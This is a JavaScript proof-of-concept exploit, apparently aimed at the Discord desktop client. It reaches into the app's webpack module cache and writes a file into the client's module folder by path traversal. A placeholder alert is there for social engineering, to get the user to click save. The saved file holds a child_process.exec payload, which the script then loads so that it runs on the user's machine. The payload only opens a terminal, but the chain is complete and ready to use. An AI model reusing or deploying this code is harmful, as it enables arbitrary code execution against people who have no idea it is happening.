(async function () {
  const req = window.webpackJsonp.push([[], {__extra_id__: (module, exports, req) => module.exports = req}, [["__extra_id__"]]]);

  delete req.m.__extra_id__;
  delete req.c.__extra_id__;

  const find = (filter) => {
    for (const i in req.c) {
      if (req.c.hasOwnProperty(i)) {
          const m = req.c[i].exports;
          if (m && m.__esModule && m.default && filter(m.default)) return m.default;
          if (m && filter(m))	return m;
      }
    }

    // console.warn("Cannot find loaded module in cache");
    return null;
  };

  const findByProps = (...propNames) => find(module => propNames.every(prop => module[prop] !== undefined));

  const os = findByProps('ua').os.family; // Get OS from electron webpack module
  const pathSeparator = os === 'Windows' ? '\\' : '/';
  const modulePath = await DiscordNative.fileManager.getModulePath();
  const rpcPathAbsolute = modulePath;
  const rpcPathHomeRelative = `..${pathSeparator}`.repeat(50) + (os === 'Windows' ? rpcPathAbsolute.replace(/[A-Z]\:\\/, '') : rpcPathAbsolute); // Get home relative path via back traversal

  const rand = Math.round(Math.random() * 100000).toString(); // Random filename for better replayability
  
  alert('Press save / <social engineering message here to get the user to save after> (this alert is not needed, just for demo)');

  const payload = `require('child_process').exec(${os === 'Windows' ? "'start cmd.exe'" : "'xfce4-terminal'"})`; // If windows: launch cmd, else launch xfce4-terminal (example cmd / terminal gui app)

  await DiscordNative.fileManager.saveWithDialog(
    payload,
    `${rpcPathHomeRelative}${pathSeparator}discord_rce${rand}.js`
  ); // Ask user to save file with file path, name (and contents) already filled
  
  DiscordNative.nativeModules.requireModule(`discord_rce${rand}`); // Require the module, executing the payload
})();
